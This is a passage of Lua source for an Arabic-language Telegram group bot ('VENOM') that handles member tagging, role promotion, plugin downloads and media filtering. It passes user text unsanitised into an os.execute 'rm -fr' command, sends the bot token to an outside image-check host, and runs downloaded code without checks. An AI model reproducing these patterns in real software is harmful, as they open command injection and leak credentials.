if database:get(bot_id.."banda:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then   
return  
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك") 
end 
database:setex(bot_id..'banda:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa)  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,ban) 
x = 0 
tags = 0 
local list = ban.members_ 
for k, v in pairs(list) do 
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) 
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
t = "#all "..ttag.."" 
end 
x = x + 1 
tagname = data.first_name_ 
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")" 
if x == 5 or x == tags or k == 0 then 
local Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
sendText(msg.chat_id_,Text,0,'md') 
end 
end,nil) 
end 
end,nil) 
end,nil) 
end 
end

if text == "تاك للكل"  and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."banda:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'banda:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,ban)
x = 0
tags = 0
local list = ban.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end


if text == 'الملفات' and Devban(msg) then
t = ' 𖥔 ملفات السورس فينوم↓\n ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف  ↚ {'..v..'}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "متجر الملفات" or text == 'المتجر' then
if Devban(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 𖥔 اهلا بك في متجر ملفات فينوم\n 𖥔 ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 علامة تعني { ✔️ } ملف مفعل\n 𖥔 علامة تعني { ✖ } ملف معطل\n 𖥔 قناة سورس فينوم↓\n".." 𖥔 [اضغط هنا لدخول](t.me/SOURCEVENOM) \n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("File_Bot/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔️)"
else
CeckFile = "(✖)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."→* {`"..name..'`}  ↚ '..CeckFile..'\n[-Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," 𖥔 لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and Devban(msg) then
local name_t = {string.match(text, "^(تعطيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " 𖥔 الملف  ↚ "..file.."\n 𖥔 تم تعطيل ملف \n"
else
t = " 𖥔 بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('VENOM.lua')  
else
send(msg.chat_id_, msg.id_," 𖥔 عذرا الملف لايدعم سورس فينوم\n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and Devban(msg) then
local name_t = {string.match(text, "^(تفعيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " 𖥔 بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " 𖥔 الملف  ↚ "..file.."\n 𖥔 تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('VENOM.lua')  
else
send(msg.chat_id_, msg.id_," 𖥔 عذرا الملف لايدعم سورس فينوم\n") 
end
return false
end
if text == "مسح الملفات" and Devban(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," 𖥔 تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and Devban(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and Devban(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مطور'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and Devban(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and Devban(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and Devban(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا ����ستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and Devban(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("مسح قائمه المالك") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح قائمه المالك')
return false
end

if text == 'قائمه المالك' and Sudo(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n 𖥔 قائمه المالك\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالك") or text == ("تاك للمالك") then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مالك@(.*)$") and Sudo(msg) then
local username = text:match("^رفع مالك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مالك'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع مالك(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مالك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مالك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من مالك'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مالك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من مالك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------

if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = " 𖥔 المنشئين الاساسين تعالو مخرب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖥔 قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = " 𖥔 المنشئين الاساسين تعالو مخرب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖥔 قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end

if text == 'تفعيل التحويل' and CoSu(msg) then   
if database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:ban'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and CoSu(msg) then  
if not database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:ban'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل امر تحويل'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:ban'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

-------------------
------------------------------------------------------------------------
if text == ("مسح الاساسين") and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n 𖥔 قائمة المنشئين الاساسين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
